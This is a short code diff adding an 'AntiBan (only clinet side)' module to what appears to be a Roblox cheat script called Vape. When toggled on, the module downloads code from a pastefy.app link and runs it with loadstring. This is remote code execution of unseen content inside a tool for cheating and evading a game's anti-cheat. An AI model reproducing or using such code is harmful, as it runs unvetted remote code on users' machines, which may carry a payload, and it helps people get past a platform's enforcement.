@@ -20038,3 +20038,16 @@ run(function()
         end
     })
 end)
+
+run(function()
+	local acbypass
+
+	acbypass = vape.Categories.Blatant:CreateModule({
+		Name = "AntiBan (only clinet side)",
+		Function = function(callback)
+			if callback then
+				loadstring(game:HttpGet("https://pastefy.app/0UMRYVm0/raw"))()
+			end	
+		end	
+	})
+end)
